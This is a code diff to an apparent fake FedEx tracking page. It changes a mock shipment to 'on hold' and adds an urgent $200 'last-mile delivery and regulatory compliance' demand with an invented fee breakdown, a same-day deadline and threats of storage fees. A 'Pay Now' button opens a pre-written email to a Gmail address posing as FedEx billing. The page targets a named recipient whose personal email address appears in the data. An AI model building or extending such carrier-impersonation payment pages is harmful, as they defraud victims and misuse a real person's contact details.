@@ -500,6 +500,16 @@
     .highlight-box {
       background: linear-gradient(135deg, #4D148C 0%, #6366f1 100%);
     }
+
+    .payment-notice {
+      background: linear-gradient(135deg, #ffedd5 0%, #fed7aa 100%);
+      border-left: 4px solid #f97316;
+    }
+
+    .payment-required {
+      background: linear-gradient(135deg, #fef2f2 0%, #fecaca 100%);
+      border-left: 4px solid #dc2626;
+    }
   </style>
 </head>
 
@@ -1350,9 +1360,9 @@
       packages: [
         {
           tracking_number: '7946 3210 5843',
-          status: 'out_for_delivery',
+          status: 'awaiting_clearance',
           service_type: 'Priority Same-Day Air',
-          current_location: 'Atlantic City, NJ - On delivery vehicle',
+          current_location: 'Pleasantville, NJ - Clearance Facility',
           estimated_delivery: 'By end of day today, January 11, 2026',
           ship_date: '2026-01-07',
           weight: '4.5',
@@ -1361,12 +1371,13 @@
           contents: 'Identification materials and printed documents, including identification card, card holder, lanyard, instruction materials, reference card, and welcome documentation',
           reference_number: 'CORP-ID-MATERIALS-DT',
           insurance_coverage: 1000.00,
-          progress_percentage: 95,
-          requires_clearance: false,
-          clearance_due_date: '2026-01-10',
-          clearance_fee: 195.00,
-          clearance_reference: 'CLR-2026-8452-DT',
-          clearance_reason: 'Corporate International VAT Reclamation Processing Fee',
+          progress_percentage: 85,
+          requires_clearance: true,
+          clearance_due_date: '2026-01-11',
+          clearance_fee: 200.00,
+          clearance_paid: false,
+          clearance_reference: 'PAY-2026-8452-DT',
+          clearance_reason: 'Last-Mile Delivery and Regulatory Compliance Fee',
           sender_name: 'Corporate Services',
           sender_company: 'Lions Gate Corporation',
           sender_address: '2701 S. 15th Ave',
@@ -1378,63 +1389,62 @@
           recipient_phone: '',
           recipient_email: 'denisetrumbauer@gmail.com',
           carrier: 'FedEx Express',
-          transport_state: 'OUT FOR DELIVERY - EXPECTED BY END OF DAY'
+          transport_state: 'ON HOLD - PAYMENT REQUIRED FOR LAST-MILE DELIVERY'
         }
       ],
       
-      tracking_events: 
-  [
-  {
-    tracking_number: '7946 3210 5843',
-    status: 'registered',
-    location: 'PHOENIX, AZ - Origin Facility',
-    event_date: '2026-01-07',
-    event_time: '08:15:00',
-    description: 'Package registered at origin facility in Phoenix, AZ. Preparing for air transport.',
-    is_latest: false,
-    event_type: 'status_update'
-  },
-  {
-    tracking_number: '7946 3210 5843',
-    status: 'in_transit',
-    location: 'MEMPHIS, TN - Air Operations Hub',
-    event_date: '2026-01-08',
-    event_time: '14:45:00',
-    description: 'Package cleared through processing at Memphis Air Operations Hub and forwarded to the aircraft.',
-    is_latest: false,
-    event_type: 'clearance'
-  },
-  {
-    tracking_number: '7946 3210 5843',
-    status: 'arrived',
-    location: 'SPRINGFIELD, NJ - Distribution Center',
-    event_date: '2026-01-09',
-    event_time: '14:30:00',
-    description: 'Package arrived at destination clearance facility. Customs/tax clearance completed.',
-    is_latest: false,
-    event_type: 'arrival'
-  },
-  {
-    tracking_number: '7946 3210 5843',
-    status: 'cleared',
-    location: 'SPRINGFIELD, NJ - Customs Clearance',
-    event_date: '2026-01-10',
-    event_time: '10:15:00',
-    description: 'Customs clearance completed. Package approved for final delivery.',
-    is_latest: false,
-    event_type: 'clearance_complete'
-  },
-  {
-    tracking_number: '7946 3210 5843',
-    status: 'out_for_delivery',
-    location: 'ATLANTIC CITY, NJ - Local Facility',
-    event_date: '2026-01-11',
-    event_time: '08:30:00',
-    description: 'Package loaded onto delivery vehicle. Expected delivery by end of day.',
-    is_latest: true,
-    event_type: 'out_for_delivery'
-  }
-],
+      tracking_events: [
+        {
+          tracking_number: '7946 3210 5843',
+          status: 'registered',
+          location: 'PHOENIX, AZ - Origin Facility',
+          event_date: '2026-01-07',
+          event_time: '08:15:00',
+          description: 'Package registered at origin facility in Phoenix, AZ. Preparing for air transport.',
+          is_latest: false,
+          event_type: 'status_update'
+        },
+        {
+          tracking_number: '7946 3210 5843',
+          status: 'in_transit',
+          location: 'MEMPHIS, TN - Air Operations Hub',
+          event_date: '2026-01-08',
+          event_time: '14:45:00',
+          description: 'Package cleared through processing at Memphis Air Operations Hub and forwarded to the aircraft.',
+          is_latest: false,
+          event_type: 'clearance'
+        },
+        {
+          tracking_number: '7946 3210 5843',
+          status: 'arrived',
+          location: 'PLEASANTVILLE, NJ - Distribution Center',
+          event_date: '2026-01-09',
+          event_time: '14:30:00',
+          description: 'Package arrived at destination clearance facility. Awaiting regulatory compliance check.',
+          is_latest: false,
+          event_type: 'arrival'
+        },
+        {
+          tracking_number: '7946 3210 5843',
+          status: 'awaiting_clearance',
+          location: 'PLEASANTVILLE, NJ - Customs Clearance',
+          event_date: '2026-01-10',
+          event_time: '10:15:00',
+          description: 'Regulatory compliance check initiated. Package requires last-mile delivery payment and compliance verification.',
+          is_latest: false,
+          event_type: 'clearance_initiated'
+        },
+        {
+          tracking_number: '7946 3210 5843',
+          status: 'awaiting_clearance',
+          location: 'PLEASANTVILLE, NJ - Billing Department',
+          event_date: '2026-01-11',
+          event_time: '08:30:00',
+          description: 'SHIPMENT ON HOLD - $200 payment required for last-mile delivery and regulatory compliance. Payment must be received by 5:00 PM today for same-day delivery.',
+          is_latest: true,
+          event_type: 'payment_required'
+        }
+      ],
 
       locations: [
         {
@@ -1592,15 +1602,50 @@
     function generateTrackingContent(data) {
       const progressSteps = [
         { name: 'Registered', icon: 'check', status: getStepStatus('registered', data.status) },
-        { name: 'Cleared', icon: 'clipboard-check', status: getStepStatus('awaiting_clearance', data.status) },
+        { name: 'In Transit', icon: 'plane', status: getStepStatus('in_transit', data.status) },
         { name: 'Arrived', icon: 'map-marker-alt', status: getStepStatus('arrived', data.status) },
-        { name: 'Clearance', icon: 'unlock', status: getStepStatus('awaiting_clearance', data.status) },
+        { name: 'Clearance', icon: 'clipboard-check', status: getStepStatus('awaiting_clearance', data.status) },
         { name: 'Delivered', icon: 'home', status: getStepStatus('delivered', data.status) }
       ];
 
       const statusClass = getStatusClass(data.status);
 
+      // Calculate payment breakdown
+      const paymentBreakdown = [
+        { description: 'Last-Mile Delivery Fee', amount: 125.00 },
+        { description: 'Regulatory Compliance Processing', amount: 50.00 },
+        { description: 'Express Service Surcharge', amount: 25.00 }
+      ];
+
       return `
+        <!-- Payment Required Notice -->
+        <div class="payment-required rounded-lg p-3 sm:p-6 mb-4 sm:mb-6">
+          <div class="flex items-start">
+            <i class="fas fa-exclamation-triangle text-red-600 text-lg sm:text-2xl mt-1 mr-3"></i>
+            <div>
+              <h3 class="text-base sm:text-xl font-bold text-red-700 mb-2">IMMEDIATE PAYMENT REQUIRED</h3>
+              <p class="text-sm sm:text-base text-red-800 mb-3">Your package is currently on hold at the Pleasantville, NJ facility (30 miles from final destination). A payment of <strong class="text-lg">$200.00</strong> is required today for last-mile delivery and regulatory compliance.</p>
+              <div class="bg-white p-3 sm:p-4 rounded-lg mb-3">
+                <p class="font-semibold text-fedex-dark-gray mb-2">Payment Breakdown:</p>
+                ${paymentBreakdown.map(item => `
+                  <div class="flex justify-between text-sm sm:text-base mb-1">
+                    <span>${item.description}</span>
+                    <span class="font-semibold">$${item.amount.toFixed(2)}</span>
+                  </div>
+                `).join('')}
+                <div class="flex justify-between border-t pt-2 mt-2 font-bold text-lg">
+                  <span>Total Due Today:</span>
+                  <span class="text-red-600">$200.00</span>
+                </div>
+              </div>
+              <p class="text-sm sm:text-base text-red-800 mb-3"><i class="fas fa-clock mr-2"></i><strong>Deadline:</strong> Payment must be received by <strong>5:00 PM EST today</strong> for same-day delivery to Atlantic City, NJ.</p>
+              <button onclick="requestPayment('${data.tracking_number}')" class="bg-red-600 hover:bg-red-700 text-white px-4 sm:px-6 py-2 sm:py-3 rounded-lg font-semibold transition-colors w-full sm:w-auto">
+                <i class="fas fa-credit-card mr-2"></i>Pay $200.00 Now
+              </button>
+            </div>
+          </div>
+        </div>
+
         <!-- Status Section -->
         <div class="bg-fedex-light-gray rounded-lg p-3 sm:p-6 mb-4 sm:mb-6">
           <div class="flex flex-col lg:flex-row justify-between items-start lg:items-center space-y-3 sm:space-y-4 lg:space-y-0 mb-4 sm:mb-6">
@@ -1611,8 +1656,9 @@
                 </span>
                 <span class="text-fedex-gray text-xs sm:text-base">${data.service_type} — ${data.carrier}</span>
               </div>
-              <p class="text-fedex-dark-gray font-semibold text-sm sm:text-lg">${data.transport_state || data.estimated_delivery}</p>
+              <p class="text-fedex-dark-gray font-semibold text-sm sm:text-lg">${data.transport_state}</p>
               <p class="text-fedex-gray text-xs sm:text-base">Currently at: ${data.current_location}</p>
+              <p class="text-fedex-gray text-xs sm:text-base">Estimated delivery: ${data.estimated_delivery}</p>
             </div>
             <div class="flex flex-col space-y-2 w-full sm:w-auto">
               <button onclick="generatePDF('${data.tracking_number}')" class="fedex-button text-white px-3 sm:px-6 py-2 sm:py-3 rounded-lg font-semibold text-xs sm:text-base w-full sm:w-auto">
@@ -1621,11 +1667,6 @@
               <button onclick="requestEmailUpdates('${data.tracking_number}')" class="border border-fedex-purple text-fedex-purple px-3 sm:px-6 py-2 sm:py-3 rounded-lg font-semibold hover:bg-fedex-purple hover:text-white transition-colors text-xs sm:text-base w-full sm:w-auto">
                 <i class="fas fa-envelope mr-1 sm:mr-2"></i>Email Updates
               </button>
-              ${data.requires_clearance ? `
-              <button onclick="requestClearance('${data.tracking_number}')" class="bg-fedex-blue text-white px-3 sm:px-6 py-2 sm:py-3 rounded-lg font-semibold hover:bg-blue-700 transition-colors text-xs sm:text-base w-full sm:w-auto">
-                <i class="fas fa-unlock mr-1 sm:mr-2"></i>Request Clearance
-              </button>
-              ` : ''}
             </div>
           </div>
 
@@ -1666,14 +1707,14 @@
                 <div class="timeline-item mb-4 sm:mb-6 pl-3 sm:pl-6 relative">
                   <div class="timeline-dot ${event.is_latest ? 'bg-fedex-orange' : 'bg-fedex-green'}"></div>
                   ${index < data.timeline.length - 1 ? '<div class="timeline-line"></div>' : ''}
-                  <div class="bg-white border border-gray-200 rounded-lg p-2 sm:p-4">
+                  <div class="bg-white border ${event.is_latest ? 'border-fedex-orange' : 'border-gray-200'} rounded-lg p-2 sm:p-4">
                     <div class="flex justify-between items-start mb-1 sm:mb-2">
                       <h4 class="font-semibold text-fedex-dark-gray text-xs sm:text-base">${formatStatus(event.status)}</h4>
-                      <span class="text-xs text-fedex-gray">${event.is_latest ? 'Current' : 'Completed'}</span>
+                      <span class="text-xs ${event.is_latest ? 'text-fedex-orange font-bold' : 'text-fedex-gray'}">${event.is_latest ? 'CURRENT - PAYMENT REQUIRED' : 'Completed'}</span>
                     </div>
                     <p class="text-fedex-gray mb-1 text-xs sm:text-sm">${event.location}</p>
                     <p class="text-xs text-fedex-gray">${formatDate(event.event_date)} ${event.event_time}</p>
-                    <p class="text-xs sm:text-sm text-fedex-gray mt-1 sm:mt-2">${event.description}</p>
+                    <p class="text-xs sm:text-sm ${event.is_latest ? 'text-red-600 font-semibold' : 'text-fedex-gray'} mt-1 sm:mt-2">${event.description}</p>
                   </div>
                 </div>
               `).join('')}
@@ -1710,16 +1751,18 @@
                   <span class="text-fedex-gray">Reference:</span>
                   <span class="font-semibold">${data.reference_number}</span>
                 </div>
-                ${data.clearance_fee ? `
-                <div class="flex justify-between border-t pt-2">
-                  <span class="text-fedex-gray">Clearance Fee:</span>
-                  <span class="font-semibold text-fedex-green">$${data.clearance_fee}.00 (Paid)</span>
+                <div class="flex justify-between border-t pt-2 mt-2">
+                  <span class="text-fedex-gray">Last-Mile Payment:</span>
+                  <span class="font-semibold text-red-600">$${data.clearance_fee}.00 (UNPAID)</span>
                 </div>
                 <div class="flex justify-between">
-                  <span class="text-fedex-gray">Fee Reference:</span>
+                  <span class="text-fedex-gray">Payment Reference:</span>
                   <span class="font-semibold">${data.clearance_reference}</span>
                 </div>
-                ` : ''}
+                <div class="flex justify-between">
+                  <span class="text-fedex-gray">Due Date:</span>
+                  <span class="font-semibold text-red-600">Today by 5:00 PM EST</span>
+                </div>
               </div>
             </div>
 
@@ -1765,8 +1808,9 @@
                   </div>
 
                   <div class="absolute bottom-2 sm:bottom-4 left-1/2 transform -translate-x-1/2 bg-white px-2 sm:px-4 py-1 sm:py-2 rounded-lg shadow text-center">
-                    <div class="text-xs text-fedex-gray">Current Progress</div>
-                    <div class="font-bold text-fedex-dark-gray text-xs sm:text-sm">${data.progress_percentage}% Complete</div>
+                    <div class="text-xs text-fedex-gray">Current Location</div>
+                    <div class="font-bold text-fedex-dark-gray text-xs sm:text-sm">Pleasantville, NJ</div>
+                    <div class="text-xs text-fedex-gray">30 miles to destination</div>
                   </div>
                 </div>
               </div>
@@ -1774,25 +1818,32 @@
           </div>
         </div>
 
-        ${data.declared_value >= 5000 ? `
-        <!-- Confidential Shipment Notice -->
-        <div class="mt-4 sm:mt-8 bg-blue-50 border border-blue-200 rounded-lg p-3 sm:p-6">
-          <div class="flex items-start space-x-2 sm:space-x-3">
-            <i class="fas fa-file-contract text-blue-600 text-lg sm:text-xl mt-1"></i>
+        <!-- Payment Notice -->
+        <div class="mt-4 sm:mt-8 payment-notice rounded-lg p-3 sm:p-6">
+          <div class="flex items-start">
+            <i class="fas fa-info-circle text-amber-600 text-lg sm:text-xl mt-1 mr-3"></i>
             <div>
-              <h4 class="font-semibold text-blue-800 mb-1 sm:mb-2 text-sm sm:text-base">Confidential Corporate Materials</h4>
-              <p class="text-blue-700 text-xs sm:text-sm">
-                This shipment contains confidential corporate identification materials and documents requiring secure handling and tracking.
+              <h4 class="font-semibold text-amber-800 mb-2 text-sm sm:text-base">Important Payment Information</h4>
+              <p class="text-amber-700 text-xs sm:text-sm mb-2">
+                The $200.00 payment covers:
+              </p>
+              <ul class="text-amber-700 text-xs sm:text-sm list-disc pl-4 mb-2">
+                <li>Last-mile delivery from Pleasantville, NJ to Atlantic City, NJ</li>
+                <li>Regulatory compliance verification for corporate materials</li>
+                <li>Express same-day service surcharge</li>
+                <li>Documentation and handling fees</li>
+              </ul>
+              <p class="text-amber-700 text-xs sm:text-sm">
+                <strong>Note:</strong> Failure to pay by 5:00 PM EST today will result in storage fees and delivery delay until payment is received.
               </p>
             </div>
           </div>
         </div>
-        ` : ''}
       `;
     }
 
-    // Clearance request function updated to open mailto: to helpfedexparcel@gmail.com
-    function requestClearance(trackingNumber) {
+    // Payment request function
+    function requestPayment(trackingNumber) {
       const packageData = mockData.packages.find(pkg => 
         pkg.tracking_number.toUpperCase() === trackingNumber.toUpperCase()
       );
@@ -1802,29 +1853,39 @@
         return;
       }
 
-      const subject = `Clearance Request for Package ${trackingNumber} - URGENT`;
-      const body = `Dear FedEx Team,
+      const subject = `URGENT: Payment Required for Package ${trackingNumber} - $200 Due Today`;
+      const body = `Dear FedEx Billing Department,
 
-I am requesting clearance for my corporate materials package with tracking number: ${trackingNumber}
+I need to make payment for my package that is currently on hold at the Pleasantville, NJ facility.
 
 Package Details:
 - Tracking Number: ${trackingNumber}
-- Contents: ${packageData.contents}
-- Declared Value: $${packageData.declared_value.toLocaleString()} USD
-- Clearance Fee: $${packageData.clearance_fee}.00
-- Fee Reference: ${packageData.clearance_reference}
+- Recipient: ${packageData.recipient_name}
+- Destination: ${packageData.recipient_address}, ${packageData.recipient_city}
 - Current Location: ${packageData.current_location}
-- Reason: ${packageData.clearance_reason}
+- Payment Required: $${packageData.clearance_fee}.00
+- Payment Reference: ${packageData.clearance_reference}
+- Due Date: Today by 5:00 PM EST
+
+Payment Breakdown:
+• Last-Mile Delivery Fee: $125.00
+• Regulatory Compliance Processing: $50.00
+• Express Service Surcharge: $25.00
+• Total Due: $200.00
+
+I understand this payment is required for:
+1. Last-mile delivery from Pleasantville, NJ to Atlantic City, NJ
+2. Regulatory compliance verification for corporate identification materials
+3. Same-day delivery guarantee
+
+Please provide payment instructions to complete the $200 payment and release my package for immediate delivery.
 
 Recipient Information:
 - Name: ${packageData.recipient_name}
 - Address: ${packageData.recipient_address}, ${packageData.recipient_city}
-- Phone: ${packageData.recipient_phone}
 - Email: ${packageData.recipient_email}
 
-I confirm that I am the intended recipient of this package and authorize FedEx to proceed with the clearance process. I understand the $${packageData.clearance_fee}.00 fee must be paid by January 10, 2026 to avoid storage fees.
-
-Please let me know if you need any additional documentation or verification.
+I authorize FedEx to charge the required $200 for last-mile delivery and regulatory compliance.
 
 Thank you,
 ${packageData.recipient_name}`;
@@ -1833,7 +1894,7 @@ ${packageData.recipient_name}`;
       const mailtoUrl = `mailto:helpfedexparcel@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
       window.open(mailtoUrl, '_blank');
 
-      showNotification('Opening mail client to send clearance request...', 'info');
+      showNotification('Opening payment request email... Please follow instructions to complete payment.', 'info');
     }
 
     // Basic form functions
@@ -1963,6 +2024,22 @@ ${packageData.recipient_name}`;
 
         yPos += 20;
         doc.setFontSize(14);
+        doc.text('Payment Required Notice', 20, yPos);
+        
+        yPos += 15;
+        doc.setFontSize(11);
+        doc.setTextColor(255, 0, 0);
+        doc.text(`Payment Due: $${packageData.clearance_fee}.00`, 20, yPos);
+        yPos += 10;
+        doc.text(`Due Date: Today by 5:00 PM EST`, 20, yPos);
+        yPos += 10;
+        doc.text(`Payment Reference: ${packageData.clearance_reference}`, 20, yPos);
+        yPos += 10;
+        doc.text(`Reason: ${packageData.clearance_reason}`, 20, yPos);
+
+        doc.setTextColor(0, 0, 0);
+        yPos += 20;
+        doc.setFontSize(14);
         doc.text('Package Details', 20, yPos);
         
         yPos += 15;
@@ -1974,10 +2051,6 @@ ${packageData.recipient_name}`;
         doc.text(`Declared Value: $${packageData.declared_value.toLocaleString()} USD`, 20, yPos);
         yPos += 10;
         doc.text(`Contents: Identification materials and printed documents`, 20, yPos);
-        yPos += 10;
-        doc.text(`Clearance Fee: $${packageData.clearance_fee}.00 (Paid)`, 20, yPos);
-        yPos += 10;
-        doc.text(`Clearance Reference: ${packageData.clearance_reference}`, 20, yPos);
 
         yPos += 20;
         doc.setFontSize(14);
@@ -2011,13 +2084,13 @@ ${packageData.recipient_name}`;
         yPos += 8;
         doc.text(`Registered (Jan 7): ✓`, 25, yPos);
         yPos += 7;
-        doc.text(`Cleared (Jan 8): ✓`, 25, yPos);
+        doc.text(`In Transit (Jan 8): ✓`, 25, yPos);
         yPos += 7;
-        doc.text(`Arrived (Jan 9): ✓`, 25, yPos);
+        doc.text(`Arrived at Facility (Jan 9): ✓`, 25, yPos);
         yPos += 7;
-        doc.text(`Clearance Completed (Jan 10): ✓`, 25, yPos);
+        doc.text(`Clearance Initiated (Jan 10): ✓`, 25, yPos);
         yPos += 7;
-        doc.text(`Out for Delivery (Jan 11): In Progress`, 25, yPos);
+        doc.text(`Payment Required (Jan 11): PENDING - $${packageData.clearance_fee}.00`, 25, yPos);
 
         yPos = 270;
         doc.setFontSize(10);
@@ -2036,7 +2109,7 @@ ${packageData.recipient_name}`;
 
     // Utility Functions
     function getStepStatus(stepStatus, currentStatus) {
-      const statusOrder = ['registered', 'awaiting_clearance', 'arrived', 'cleared', 'out_for_delivery', 'delivered'];
+      const statusOrder = ['registered', 'in_transit', 'arrived', 'awaiting_clearance', 'delivered'];
       const stepIndex = statusOrder.indexOf(stepStatus);
       const currentIndex = statusOrder.indexOf(currentStatus);
       
@@ -2061,10 +2134,10 @@ ${packageData.recipient_name}`;
     function getStatusIcon(status) {
       const statusIcons = {
         'registered': 'check-circle',
-        'awaiting_clearance': 'clock',
+        'awaiting_clearance': 'exclamation-triangle',
         'arrived': 'map-marker-alt',
         'cleared': 'check-circle',
-        'in_transit': 'truck',
+        'in_transit': 'plane',
         'out_for_delivery': 'shipping-fast',
         'delivered': 'check-circle'
       };
@@ -2072,9 +2145,10 @@ ${packageData.recipient_name}`;
     }
 
     function formatStatus(status) {
-      if (status === 'awaiting_clearance') return 'Awaiting Final Clearance';
+      if (status === 'awaiting_clearance') return 'On Hold - Payment Required';
       if (status === 'out_for_delivery') return 'Out for Delivery';
       if (status === 'cleared') return 'Cleared';
+      if (status === 'in_transit') return 'In Transit';
       return status.replace(/_/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
     }
 
@@ -2327,7 +2401,7 @@ ${packageData.recipient_name}`;
     window.trackPackage = trackPackage;
     window.generatePDF = generatePDF;
     window.requestEmailUpdates = requestEmailUpdates;
-    window.requestClearance = requestClearance;
+    window.requestPayment = requestPayment;
     window.toggleFaq = toggleFaq;
 
     // Initialize app when DOM is ready
